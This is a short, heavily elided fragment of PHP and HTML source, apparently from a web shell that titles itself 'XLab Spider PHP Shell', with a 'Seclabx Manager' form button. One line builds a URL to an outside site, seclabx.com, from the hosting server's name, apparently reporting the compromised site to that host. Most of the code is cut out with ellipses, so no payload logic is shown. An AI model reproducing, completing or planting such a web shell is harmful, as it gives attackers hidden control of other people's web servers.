...
<html>
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:80px;clear:both;"><input type="submit" value="Seclabx Manager" ></div>
		</div>
		</form>
		</center>
	</body>
...
function WinMain()
{
	...
	$Server_Alexa = 'https://www.seclabx.com/work/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
print<<<END
<html>
	<title> XLab Spider PHP Shell </title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
